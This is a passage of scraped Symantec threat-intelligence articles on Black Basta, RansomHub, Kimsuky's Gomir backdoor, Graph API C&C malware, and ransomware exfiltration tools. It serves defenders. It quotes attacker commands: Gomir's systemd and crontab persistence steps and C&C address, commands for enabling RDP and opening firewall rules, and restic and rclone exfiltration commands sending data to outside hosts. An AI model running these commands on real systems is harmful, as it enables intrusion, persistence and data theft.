4aae231fb5357c0647483181aeae47956ac66e42b6b134f5b90da76d8ec0ac63) had a compilation time stamp of February 27, 2024, several weeks before the vulnerability was patched. A second variant of the tool discovered on Virus Total (SHA256: b73a7e25d224778172e394426c98b86215087d815296c71a3f76f738c720c1b0) had an earlier compilation time stamp of December 18, 2023. Time stamp values in portable executables are modifiable, which means that a time stamp is not conclusive evidence that the attackers were using the exploit as a zero-day. However, in this case there appears to be little motivation for the attackers to change the time stamp to an earlier date. Cardinal introduced Black Basta in April 2022 and from its inception, the ransomware was closely associated with the Qakbot botnet, which appeared to be its primary infection vector. Qakbot was one of the world’s most prolific malware distribution botnets until itwas taken down following law enforcement action in August 2023. However, while the takedown led to a dip in Black Basta activity, Cardinal has since resumed attacks andnow appears to have switched to working with the operators of the DarkGate loaderto obtain access to potential victims.

    "content": "RansomHub, a new Ransomware-as-a-Service (RaaS) that has rapidly become one of the largest ransomware groups currently operating, is very likely an updated and rebranded version of the older Knight ransomware. Analysis of the RansomHub payload by Symantec, part of Broadcom, revealed a high degree of similarity between the two threats, suggesting that Knight was the starting point for RansomHub. Despite shared origins, it is unlikely that Knight’s creators are now operating RansomHub. Source code for Knight (originally known as Cyclops) wasoffered for sale on underground forums in February 2024after Knight’s developers decided to shut down their operation. It is possible that other actors bought the Knight source code and updated it before launching RansomHub. Both payloads are written in Go and most variants of each family are obfuscated withGobfuscate.  Only some early versions of Knight are not obfuscated. The degree of code overlap between the two families is significant, making it very difficult to differentiate between them.  In many cases, a determination could only be confirmed by checking the embedded link to the data leak site. The two families have virtually identical help menus available on the command line. The sole difference is the addition of a sleep command in RansomHub. Both threats employ a unique obfuscation technique, where important strings are each encoded with a unique key and decoded at runtime. For example, in the command “cmd.exe /c iisreset.exe /stop”, only the iisrest.exe string is encrypted with a unique key. There are significant similarities between the ransom notes left by both payloads, with many phrases used by Knight appearing verbatim in the RansomHub note, suggesting that the developers simply edited and updated the original note. One of the main differences between the two ransomware families is the commands run through cmd.exe. These commands may be configured when the payload is built or during configuration.  Although the commands themselves are different, the way and order in which they are called relative to other operations is the same. A unique feature present in both Knight and RansomHub is the ability to restart an endpoint in safe mode before starting encryption. This technique was previously employed by Snatch ransomware in 2019 and allows encryption to progress unhindered by operating system or other security processes. Snatch is also written in Go and has many similar features, suggesting it could be another fork of the same original source code used to develop Knight and RansomHub. However, Snatch contains significant differences, including an apparent lack of configurable commands or any sort of obfuscation. Another ransomware family thatrestarts the affected computer in safe mode before encryption is NoberusInterestingly, the encryptor stores its configuration in a JSONwhere keywords match what was observed in RansomHub. In recent RansomHub attacks investigated by Symantec, the attackers gained initial access by exploiting the Zerologon vulnerability (CVE-2020-1472), which can allow an attacker to gain domain administrator privileges and take control of the entire domain. The attackers used several dual-use tools before deploying the ransomware. Atera and Splashtop were used to facilitate remote access, while NetScan was used to likely discover and retrieve information about network devices. The RansomHub payload leveraged the iisreset.exe and iisrstas.exe command-line tools to stop all Internet Information Services (IIS) services. Despite only first appearing in February 2024, RansomHub has managed to grow very quickly and, over the past three months, was the fourth most prolific ransomware operator in terms of numbers of attacks publicly claimed. The group last weekclaimed responsibility for an attack on UK auction house Christies. One factor contributing to RansomHub’s growth may be the group’s success in attracting some large former affiliates of the Noberus (aka ALPHV, Blackcat) ransomware group, which closed earlier this year. One former Noberus affiliate known as Notchyis now reportedly working with RansomHub. In addition to this, tools previously associated with another Noberus affiliate known as Scattered Spider, were used in a recent RansomHub attack. The speed at which RansomHub has established its business suggests that the group may consist of veteran operators with experience and contacts in the cyber underground.

    "title": "springtail kimsuky backdoor espionage",
    "link": "https://www.security.com/threat-intelligence/springtail-kimsuky-backdoor-espionage",
    "content": "Symantec’s Threat Hunter Team has uncovered a new Linux backdoor developed by the North Korean Springtail espionage group (aka Kimsuky) that is linked to malware used in a recent campaign against organizations in South Korea. The backdoor (Linux.Gomir) appears to be a Linux version of the GoBear backdoor, which was used in a recent Springtail campaign that saw the attackers deliver malware via Trojanized software installation packages. Gomir is structurally almost identical to GoBear, with extensive sharing of code between malware variants. Springtail is a tight-knit espionage group that initially specialized in attacks on public sector organizations in South Korea. The group first came to public attention in 2014, when the South Korean governmentsaid it was responsible for an attack on Korea Hydro and Nuclear Power (KHNP). Multiple employees at KHNP were targeted with spear-phishing emails containing exploits that installed disk-wiping malware on their machines. The U.S. government has said that the group is a unit of North Korea’s military intelligence organization, the Reconnaissance General Bureau (RGB). The group was the subject of a U.S. government alert in recent days due to attempts to exploit improperly configured DNS Domain-based Message Authentication, Reporting and Conformance (DMARC) record policies to conceal social engineering attempts.According to a joint advisory issued by the Federal Bureau of Investigation (FBI), the U.S. Department of State, and the National Security Agency (NSA), the group has been mounting spear phishing campaigns pretending to be journalists, academics, and experts in East Asian affairs “with credible links to North Korean policy circles”. The campaign,which was first documented by South Korean security firm S2W in February 2024, saw Springtail deliver a new malware family named Troll Stealer using Trojanized software installation packages. Troll Stealer can steal a range of information from infected computers including files, screenshots, browser data, and system information. Written in Go, like many newer Springtail malware families, Troll Stealer contained a large amount of code overlap with earlier Springtail malware. Troll Stealer’s functionality included the ability to copy the GPKI (Government Public Key Infrastructure) folder on infected computers.GPKI is the public key infrastructure schemafor South Korean government personnel and state organizations, suggesting that government agencies were among the targets of the campaign. S2W reported that the malware was distributed inside installation packages for TrustPKI and NX_PRNMAN, software developed by SGA Solutions. The installation packages were reportedly downloaded from a page that was redirected from a specific website. South Korean security firm AhnLabsubsequently provided further detailson the downloads, saying they originated from the website of an association in the construction sector. The website required users to log in and the affected packages were among those users had to install to do so. Symantec has since discovered that Troll Stealer was also delivered in Trojanized Installation packages for Wizvera VeraPort. It is unclear how these installation packages were delivered during the current campaign. Wizvera VeraPort waspreviously reported to have been compromisedin a North Korea-linked software supply chain attack in 2020. Troll Stealer appears to be related to another recently discovered Go-based backdoor named GoBear. Both threats are signed with a legitimate certificate issued to “D2innovation Co.,LTD”. GoBear also contains similar function names to an older Springtail backdoor known as BetaSeed, which was written in C++, suggesting that both threats have a common origin. AhnLab later explicitly linked the two threats, saying that many of the malicious installers it had analyzed contained both Troll Stealer and either of the GoBear or BetaSeed backdoors, which it referred to as the Endoor malware family. Several weeks later, GoBear was being distributed by a dropper masquerading as an installer for an app for a Korean transport organization. In this case, the attackers did not Trojanize a legitimate software package but instead disguised the dropper as an installer featuring the organization’s logos. The dropper was signed with what appeared to be a stolen certificate. Symantec’s investigation into the attacks uncovered a Linux version of this malware family (Linux.Gomir) which is structurally almost identical and shares an extensive amount of distinct code with the Windows Go-based backdoor GoBear. Any functionality from GoBear that is operating system-dependent is either missing or reimplemented in Gomir. When executed, it checks its command line and if contains the string “install” as its only argument, it will attempt to install itself with persistence. To determine how it installs itself, Gomir checks the effective group ID (as reported by the getegid32() syscall) of its own process. If the process is running as group 0, Gomir assumes that it is running with superuser privileges and attempts to copy itself as the following file: It then attempts to create a systemd service with the name \"syslogd\" by creating the file: /etc/systemd/system/syslogd.service ExecStart=/bin/sh -c \"/var/log/syslogd\" WantedBy=multi-user.target Gomir will then enable and start the created service by executing the following sequence of commands: ${SHELL} -c systemctl daemon-reload ${SHELL} -c systemctl reenable syslogd ${SHELL} -c systemctl start syslogd It will then delete the original executable and terminate the original process. If the process is running as any group other than 0, Gomir attempts to configure a crontab to start the backdoor on every reboot. It first creates a helper file (cron.txt) in the current working directory with the following content: @reboot [PATHNAME_OF_THE_EXECUTING_PROCESS] Next, it seems to attempt to list any pre-existing crontab entries by running the following command: /bin/sh -c crontab -l It appends the output to the created helper file. Gomir then updates the crontab configuration by executing the following command: ${SHELL} -c crontab cron.txt Gomir then deletes the helper file before executing itself without any command-line parameters. Once installed and running, Gomir periodically communicates with its command-and-control (C&C) server by sending HTTP POST requests to: http://216.189.159[.]34/mir/index.php When pooling for commands to execute, Gomir requests with the following HTTP request body: a[9_RANDOM_ALPHANUMERIC_CHARACTERS]=2&b[9_RANDOM_ALPHANUMERIC_CHARACTERS]=[INFECTION_ID]1&c[9_RANDOM_ALPHANUMERIC_CHARACTERS]= The INFECTION_ID is generated using the following method: def generate_infection_id(hostname, username): hexdigest = hashlib.md5(hostname + username).hexdigest() return \"g-\" + hexdigest[:10] The expected body of the HTTP server response is a string starting with the letter S. Gomir then attempts to decode the remaining characters of the string using the Base64 algorithm. The decoded blob has the following structure: Gomir then uses a custom encryption algorithm to decrypt the previously discussed command. The first two characters of the command identify the operation to execute. Gomir allows the execution of 17 different commands. The commands are almost identical to those supported by the GoBear Windows backdoor: This latest Springtail campaign provides further evidence that software installation packages and updates are now among the most favored infection vectors for North Korean espionage actors. Variations of this tactic include: The most notable example to date is the3CX supply chain attack, which itself was the result of the earlierX_Trader supply chain attack. Springtail, meanwhile, has focused on Trojanized software installers hosted on third-party sites requiring their installation or masquerading as official apps. The software targeted appears to have been carefully chosen to maximize the chances of infecting its intended South Korean-based targets.

    "title": "graph api threats",
    "link": "https://www.security.com/threat-intelligence/graph-api-threats",
    "content": "An increasing number of threats have begun to leverage the Microsoft Graph API, usually to facilitate communications with command-and-control (C&C) infrastructure hosted on Microsoft cloud services. The technique was most recently used in an attack against an organization in Ukraine, where a previously undocumented piece of malware used the Graph API to leverage Microsoft OneDrive for C&C purposes. The malware found in Ukraine appeared to be named BirdyClient or OneDriveBirdyClient by its developers because references to both names were found in its code. Its file name—vxdiff.dll—was the same as a legitimate DLL associated with an application called Apoint (apoint.exe), which is driver software for Alps pointing devices, usually found in laptops. Whether the malware was simply masquerading as a legitimate file or whether it was being sideloaded by Apoint remains unknown. Analysis of the BirdyClient malware (Trojan.BirdyClient) revealed that its main functionality is to connect to the Microsoft Graph API and use Microsoft OneDrive as a C&C server mechanism to upload and download files from it. The sample also creates the following log file: %AllUsersProfile%/{0134AA2C-03BE-448D-8D28-7FFE94EA3A49}/config/001.temp To date, no related tools have been found. It remains unclear who the developers of the threat are and what their motivation is. Graph is a Microsoft API designed to allow developers to access resources hosted on Microsoft cloud services, such as Microsoft 365. Authentication is carried out using OAuth access tokens. Graph can be used to access a wide range of data and services such as email, calendar events, files, or devices. Application developers can potentially use it to pull data from one or more Microsoft services and integrate it into their own solutions. BirdyClient is the latest threat seen leveraging the Graph API. The first known usage was by the North Korea-linked Vedalia espionage group (aka APT37), which developed Bluelight, a second-stage payload that could communicate with several different cloud services for C&C purposes.According to Volexity, which discovered Bluelight, the variant it analyzed used the Graph API to communicate with OneDrive. In October 2021,Symantec uncovered the Harvester group, a nation-state-backed espionage operation, targeting organizations in South Asia. Its toolset included a custom backdoor called Backdoor.Graphon that used the Graph API to communicate with Microsoft infrastructure for C&C purposes. The technique came to further public attention in January 2022,with the discovery of Graphite—malware that used the Graph API to communicate with a OneDrive account that was acting as a C&C server. Graphite was deployed in a campaign against several governments in Europe and Asia. Attacks began with spear-phishing emails that delivered an Excel downloader containing a remote code execution exploit (CVE-2021-40444). This led to the installation of a second-stage downloader, followed by Graphite and a secondary payload—PowerShell Empire. The campaign was eventually linked to the Russian Swallowtail espionage group (aka APT28, Fancy Bear). Other espionage groups appeared to be quick to learn from early users and began leveraging the Graph API in their toolset. In December 2022, Elastic Securitydocumented an intrusion into the Foreign Affairs Office of an ASEAN member. Among the tools deployed was SiestaGraph, which used the Graph API to interact with both OneDrive and Microsoft 365 Mail for C&C purposes. SiestaGraph appears to be in continuous development. In September 2023, Symantec found a new variant of the malware that contained different command identifiers from those originally documented. In June 2023,Symantec discovered Backdoor.Graphican, which was being used by the Flea (aka APT15, Nickel) advanced persistent threat (APT) group in an espionage campaign heavily focused on foreign affairs ministries in the Americas. Graphican is an evolution of an older Flea backdoor known as Ketrican, which itself was based on a previous malware—BS2005—that was also used by Flea. Graphican has the same functionality as Ketrican, but its new features included the use of the Microsoft Graph API and OneDrive to obtain its C&C infrastructure. Others are learning from its use in the wild. For example, penetration-testing firm RedSiegerecently announced the development of GraphStrike, a toolset that works with Cobalt Strike to enable the Cobalt Strike Beacon payload to use the Graph API for HTTPS C&C communications. Attacker communications with C&C servers can often raise red flags in targeted organizations. The Graph API’s popularity among attackers may be driven by the belief that traffic to known entities, such as widely used cloud services, is less likely to raise suspicions. In addition to appearing inconspicuous, it is also a cheap and secure source of infrastructure for attackers since basic accounts for services like OneDrive are free. As awareness grows of this tactic, the number of attackers attempting to leverage Graph may grow further. For the latest protection updates, please visit theSymantec Protection Bulletin.

    "content": "Ransomware activity remains on an upward trend despite the number of attacks claimed by ransomware actors decreasing by slightly more than 20% in the fourth quarter of 2023. Attackers have continually refined their tactics and proven quick to respond to disruption, finding new ways to infect victims. Analysis of data from ransomware leak sites shows that attackers managed to hit significantly more victims last year (4,700) compared to 2022 (2,800). While the shutdown of the Qakbot botnet in June 2023 took a major malware distribution channel offline, attackers have quickly adapted and vulnerability exploitation now appears to be the primary vector for ransomware attacks. LockBit, the longstanding ransomware-as-service operation run by the Syrphid cybercrime group (aka Bitwise Spider), continued to be the largest ransomware threat in 2023, accounting for 21% of all attacks claimed on data leak sites. It was followed by Noberus (aka BlackCat, ALPHV) with 9% of all claimed attacks and Clop with 8%. BothLockBitandNoberushave been the target of law enforcement operations in recent weeks and it remains to be seen if these will significantly impact on activity levels from both threats over the long term. Interestingly, there are significant disparities between overall, publicly claimed activity levels and ransomware activity investigated by Symantec. While LockBit was responsible for over 21% of the 4,700 attacks claimed in 2023, they were only identified as being involved in around 17% of the attacks Symantec investigated. Conversely, Noberus claimed 9% of all attacks in 2023 but it was involved in a little over 20% of all attacks Symantec investigated. The comparison may give some indication of success rates experienced by actors linked to each operation. For Symantec to positively identify an attack as associated with a certain ransomware family, the attack has to advance to the stage where the attackers attempt to deploy a payload. This suggests that Noberus affiliates are more likely to advance their attacks at least to the payload deployment stage. The evidence from recent ransomware investigations suggests that exploitation of known vulnerabilities in public facing applications is now the main vector for ransomware attacks. Likely infection vectors in recent ransomware attacks include: The number of tools deployed by ransomware actors continues to grow. In particular, there has been a marked increase in the number of dual-use tools (legitimate software installed by attackers for malicious purposes). Tools leveraging the Bring Your Own Vulnerable Driver (BYOVD) technique are also currently popular among attackers. New tools recently seen in ransomware attacks include: Noteworthy techniques that have recently been used by ransomware actors include: Ransomware will continue to be a major threat for organizations in 2024 and beyond. Incentivised by large payouts, ransomware attackers have proven to be persistent and adaptive, capable of responding to disruption by reorganizing themselves and consistently developing new tactics.

    "content": "Ransomware actors are deploying a growing array of data-exfiltration tools in their attacks and, over the past three months alone, Symantec has found attackers using at least dozen different tools capable of data exfiltration. While some exfiltration tools are malware, the vast majority are dual-use – legitimate software used by the attackers for malicious purposes. Double extortion attacks are now standard practice for most ransomware operators. In addition to encrypting files, attackers steal data from victims and threaten to release it unless the ransom is paid. The tactic has proven to be effective, supplying attackers with more leverage to use against organizations that may be able to restore encrypted files from backups. The range of tools now being used by ransomware actors for exfiltration is growing. It would appear that this trend is driven by two factors: A growing awareness among attackers of the potential functionality in certain types of software; and a desire to find lesser-known alternatives to tools that have gained a reputation for malicious usage. While Rclone is still the most frequently used exfiltration tool by ransomware actors, the fastest growing category is remote administration and remote management tools, such as AnyDesk, ScreenConnect, and Atera. The functionality of these tools lies behind their appeal to attackers, since exfiltration is just one of their capabilities and most can act as a de-facto backdoor on a compromised computer. The most frequently used exfiltration tools over the past three months include: Rclone:Open-source toolthat can legitimately be used to manage content in the cloud, but has been seen being abused by ransomware actors to exfiltrate data from victim machines. For an example of how Rclone may be used, see case study below. AnyDesk: A legitimateremote desktop application. By installing it, attackers can obtain remote access to computers on a network. Malicious usage of AnyDesk is now a well-known TTP and, in some cases, attackers will attempt to avoid raising suspicions by renaming the AnyDesk executable to something that may appear more innocuous, a technique known as masquerading. RDP: Remote Desktop Protocol. A Microsoft-developed protocol that allows a computer to connect to and control another computer, using client/server software. Attackers can attempt to enable RDP using a variety of techniques, including leveraging multiple living-off-the-land tools. Once RDP is enabled, it allows the attackers to use any number of dual-use tools that leverage the RDP protocol.For example, an attacker may attempt to enable RDP by simply modifying a registry key: reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f The attacker may also attempt to create a firewall rule to specifically allow all incoming RDP connections using a Network Shell (netsh) command: netsh advfirewall firewall add rule name=[NAME] RemoteDesktop\" dir=in protocol=TCP localport=3389 action=allow Cobalt Strike: An off-the-shelf tool that can be used to execute commands, inject other processes, elevate current processes, or impersonate other processes, and upload and download files. It ostensibly has legitimate uses as a penetration-testing tool but is invariably exploited by malicious actors. Cobalt Strikes has been used for data exfiltration, with attackers leveraging Cobalt Strike's Beacon payload to establish covert communication channels with compromised systems, allowing them to exfiltrate sensitive data stealthily. The tool's ability to mimic normal network traffic and blend in with legitimate activity enables attackers to surreptitiously transfer valuable information from compromised networks. ScreenConnect:Aremote desktop application tool by ConnectWise, used to enable remote access to computers. Atera:Legitimate remote monitoring and access software. It and similar tools are often used by attackers to obtain remote access to computers on a network. WinRAR:Anarchive managerthat can be used to archive or zip files. Attackers have used WinRAR and similar utilities (e.g. 7-Zip) in order to prepare files for exfiltration: cmd /u [REMOVED] CSIDL_COMMON_APPDATA\\rar.exe a -dh -hp[REMOVED] -m5 CSIDL_COMMON_APPDATA\\1.rar CSIDL_COMMON_APPDATA\\1.txt > CSIDL_COMMON_APPDATA\\log.txt Restic:Open-sourcecommand line backup tooldesigned to be efficient and secure and will work with various platforms including Windows, Linux, and OSX. Restic supports various storage backends, including local directories, SFTP servers, Amazon S3, Microsoft Azure, and Google Cloud Storage, which has made it a popular choice for ransomware actors. The following is an example of Restic commands used by attackers using the Noberus ransomware. The “init” command initializes a new repository. The “-r” switch specifies the repository to backup to or restore from, while the “-use-fs-snapshot” switch instructs the application to use the file system snapshot where possible. CSIDL_COMMON_VIDEO\\restic.exe -r rest:http://[REMOVED]:8000/ init [REMOVED] CSIDL_COMMON_VIDEO\\ppp.txtCSIDL_COMMON_VIDEO\\restic.exe -r rest:http://[REMOVED]:8000/ [REMOVED] CSIDL_COMMON_VIDEO\\ppp.txt --use-fs-snapshot --verbose backup \"CSIDL_SYSTEM_DRIVE\\[REMOVED]\" TightVNC:Open-sourceremote desktop software. WinSCP:Alegitimate SFTP client and FTP clientfor Microsoft Windows. Pandora RC:Pandora Remote control (formerly known as eHorus) is a legitimate remote access tool that is sold commercially and has agents for Windows, Linux, and Mac workstations. It has also been leveraged by attackers, mainly to facilitate remote access and deployment of additional tools to assist in credential dumping and lateral movement. However, Pandora RC may also be used to facilitate exfiltration of sensitive information from targeted organizations. The remote management platform can be used from any device with a web browser. Chisel:Chisel is anopen-source proxy tool. It was designed to create encrypted, tunnelled connections, commonly used in network security testing and penetration testing scenarios. However, it has been abused during ransomware attacks to create tunnels to attacker-controlled infrastructure as part of data exfiltration activities. It creates a TCP/UDP tunnel that is transported over HTTP and secured via SSH. PowerShell:Microsoft scripting toolthat can be used to run commands, download payloads, traverse compromised networks, and carry out reconnaissance. In several ransomware attacks, the attackers have executed specific commands in order to facilitate data exfiltration, including use of the Compress-Archive cmdlet: powershell Compress-Archive CSIDL_PROFILE\\public\\[REMOVED]-fs CSIDL_PROFILE\\public\\[REMOVED]-fs.zip Rclone is anopen-source toolwhose legitimate uses include online backups and managing content in the cloud. Ransomware attackers use its capabilities to exfiltrate data from compromised networks. It is usually installed by the attackers themselves once they have infiltrated a targeted network. Rclone is now so frequently used by ransomware groups that many attackers will now rename Rclone to masquerade as something else (e.g. svchost.exe). A RagnarLocker attack which occurred in July 2023 provides an example of how Rclone can be used by ransomware actors. The first evidence of malicious activity occurred when PowerShell commands were executed to disable Local Security Authority (LSA) protection. The attackers then ran SoftPerfect Network Scanner (netscan.exe), a publicly available tool used for the discovery of host names and network services. The next day, the attackers resumed their activity, deploying Mimikatz and LaZagne to dump credentials, before using a number of living-off-the-land tools to gather system information, save registry hives, execute commands on other computers on the network, and enable the Remote Desktop Protocol (RDP) to facilitate remote access. The attackers then began using Rclone to copy data from network shares, e.g. rclone copy \\\\[REMOVED]\\[REMOVED]\\Shares --max-age 2095d [REMOVED]:[REMOVED]/ -P --exclude \"*.{zip,log,rar,wav,mp4,mpeg}\" --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6 Interestingly, there were frequent typos in the commands issued by the attackers, suggesting hands-on-keyboard activity rather than automation. The attackers then initiated Rclone connections to the Put.io file-sharing service, which acted as the destination for the exfiltrated data: https://s100.put[.]io https://s101.put[.]io https://s102.put[.]io https://s103.put[.]io https://upload.put[.]io Once the data was exfiltrated, the attackers moved on to the next stage of the attack, deployment of the RagnarLocker payload and encryption of files. Data exfiltration is now a key step in the attack chain for most ransomware actors and many see stolen data as their most effective way of extorting organizations, creating darknet data leak sites naming their victims and publishing stolen data if a ransom isn’t paid. While some malware is still being authored for this purpose, many attackers are turning to legitimate software packages in the belief that they are less likely to trigger alerts when deployed on their victims’ networks.

    "content": "Alpha, a new ransomware that first appeared in February 2023 and stepped up its operations in recent weeks, has strong similarities to the long-defunct NetWalker ransomware, which disappeared in January 2021 following aninternational law enforcement operation. Analysis of Alpha reveals significant similarities with the old NetWalker ransomware. Both threats use a similar PowerShell-based loader to deliver the payload. In addition to this, there is a significant amount of code overlap between the Alpha and NetWalker payloads. This includes: While Alpha first appeared in February 2023, it maintained a low profile until recent weeks when it appeared to begin scaling up its operations and launching a data leak site. In recent attacks involving Alpha, the attackers made heavy use of a number of living-off-the-land tools, including: NetWalker was part of the first wave of cybercrime operations to profit from targeted ransomware attacks, where attackers attempt to encrypt entire networks in order to extort their victims. One jailed group member alone is alleged to have earned over $27.6 million from attacks. Following the law enforcement operation and long cessation of activity, it had been assumed that NetWalker had completely departed. However, the similarities between Alpha and the NetWalker ransomware suggest a strong link between the two threats. Alpha may be an attempt at reviving the old ransomware operation by one or more of the original NetWalker developers.

    "content": "Although we are just a few weeks into the new year, ransomware attacks – and their costly impact on today’s enterprises –  are already makingheadlines. According to our new report,The 2024 Ransomware Threat Landscape, published today by the Symantec Threat Hunter Team, part of Broadcom, “ransomware continues to be one of the most lucrative forms of cybercrime and, as such, remains a critical threat for organizations of all sizes.” The new report analyzes the ransomware threat landscape over the past 12 months, from new operators in the field to attackers’ top tools and tactics, techniques, and procedures (TTPs) and providesactionableintelligence – including real-world attacker case studies – that can help organizations stop attacks early in the attack chain. Among the report’s key findings: Based on these findings and other intelligence, we can expect the following ransomware trends to continue through 2024 and beyond: One thing we know for certain – ransomware will remain a persistent threat to all organizations, regardless of size. To help mitigate this risk, organizations should adopt a defense-in-depth strategy, using multiple detection, protection, and hardening technologies to mitigate risk at each point of a potential attack chain. In addition, organizations should prioritize deepening their knowledge of current infection vectors used and commonly employed in ransomware attacks. This information will assist in prioritizing and identifying potential areas of weakness and help strengthen a defensive posture. As a result, defenders increasingly are turning toSymantec Adaptive Protectionin their fight against ransomware. To help close the attack routes available using living-of-the-land tools, Symantec Adaptive Protection maps out the different attack methods used by attackers and displays this data in the form of a heatmap for quick reference. Incident responders can leverage this data to understand which living-of-the-land tools are being used in various different attacks such as advanced persistent threats (APTs) and ransomware. Symantec is currently tracking 70 specific behaviors across 54 living-of-the-land tools and is uniquely positioned to quickly react and update this data based off the changing landscape. Next month, we will be publishing a paper focusing on how Adaptive Protection strategies increase efficacy and efficiency. Check back with us for more details in the coming weeks. What was our team’s number one learning about ransomware in 2023? The ransomware cybercrime ecosystem is highly durable and continues to survive disruption from law enforcement and other efforts. Yet, the good news is that there are steps you can take today to reduce the risk of ransomware. By combining actionable intelligence about ransomware attackers TTPs with Symantec Adaptive Protection, defenders can better understand how their organizations might be compromised – and take the necessary steps to protect against it. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.
